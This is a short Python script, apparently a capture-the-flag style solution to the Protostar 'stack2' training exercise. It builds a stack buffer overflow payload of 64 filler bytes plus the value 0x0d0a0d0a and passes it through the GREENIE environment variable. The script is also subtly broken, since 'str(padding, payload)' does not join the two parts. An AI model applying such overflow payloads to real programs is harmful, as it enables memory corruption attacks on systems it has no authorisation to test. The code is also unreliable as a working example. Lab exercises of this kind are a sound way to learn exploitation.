# Stack2 Protostar

import struct

padding = "\x41" * 64
payload = struct.pack("I", 0x0d0a0d0a)

print(str(padding, payload))

# export GREENIE=$(python stack2.py)